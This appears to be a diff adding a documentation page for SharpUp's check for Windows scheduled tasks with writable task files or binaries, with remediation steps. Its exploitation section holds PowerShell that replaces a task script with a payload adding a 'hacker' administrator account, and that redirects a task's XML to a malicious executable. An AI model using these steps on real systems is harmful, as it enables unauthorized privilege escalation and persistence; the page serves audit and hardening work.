@@ -1,0 +1,100 @@
+---
+title: 'Modifiable Scheduled Task'
+description: 'Scheduled tasks with weak file permissions'
+icon: 'clock'
+---
+
+## Overview
+
+The Modifiable Scheduled Task check identifies Windows scheduled tasks where either the task definition file or the binary executed by the task has weak permissions. This allows privilege escalation by modifying the task to execute malicious code with elevated privileges.
+
+## How It Works
+
+SharpUp examines scheduled tasks in `%SystemRoot%\System32\Tasks`:
+
+1. Checks if task XML file is writable
+2. Parses XML to find the command/binary to be executed
+3. Checks if the binary is writable
+4. Reports tasks where either file can be modified
+
+### Technical Details
+
+Scheduled tasks run with configured privileges (often SYSTEM). If you can modify either:
+- The task XML file
+- The executable the task runs
+
+You can execute arbitrary code with those privileges.
+
+## Example Output
+
+```
+=== Modifiable Scheduled Task ===
+    Task Name              : \Microsoft\Windows\BackupTask
+    Task Path              : C:\Windows\System32\Tasks\BackupTask
+    Command                : C:\Scripts\backup.ps1
+    Task XML Modifiable    : False
+    Task Binary Modifiable : True
+```
+
+## Exploitation
+
+### Method 1: Replace Binary
+
+```powershell
+# If binary is modifiable
+$taskBinary = "C:\Scripts\backup.ps1"
+
+# Backup original
+Copy-Item $taskBinary "$taskBinary.bak"
+
+# Replace with payload
+$payload = "net user hacker P@ss /add && net localgroup administrators hacker /add"
+$payload | Out-File $taskBinary
+
+# Wait for task to run or trigger it
+schtasks /run /tn "BackupTask"
+```
+
+### Method 2: Modify Task XML
+
+```powershell
+# If XML is modifiable
+$taskXml = "C:\Windows\System32\Tasks\BackupTask"
+
+# Read and modify XML
+[xml]$xml = Get-Content $taskXml
+$xml.Task.Actions.Exec.Command = "C:\temp\malicious.exe"
+$xml.Save($taskXml)
+
+# Task will run modified command at next schedule
+```
+
+## Remediation
+
+<Steps>
+  <Step title="Secure Task Files">
+    ```powershell
+    # Secure task directory
+    $taskPath = "$env:SystemRoot\System32\Tasks"
+    icacls $taskPath /inheritance:r
+    icacls $taskPath /grant:r "SYSTEM:(OI)(CI)F"
+    icacls $taskPath /grant:r "Administrators:(OI)(CI)F"
+    icacls $taskPath /grant:r "Users:(OI)(CI)RX"
+    ```
+  </Step>
+
+  <Step title="Secure Task Binaries">
+    Apply proper permissions to executables used by scheduled tasks.
+  </Step>
+</Steps>
+
+## Related Checks
+
+<CardGroup cols={2}>
+  <Card title="Modifiable Services" icon="gear" href="/ghostpack-docs/SharpUp-mdx/checks/modifiableservices">
+    Check for modifiable services
+  </Card>
+  <Card title="Registry Autoruns" icon="list" href="/ghostpack-docs/SharpUp-mdx/checks/registryautoruns">
+    Find modifiable autorun entries
+  </Card>
+</CardGroup>
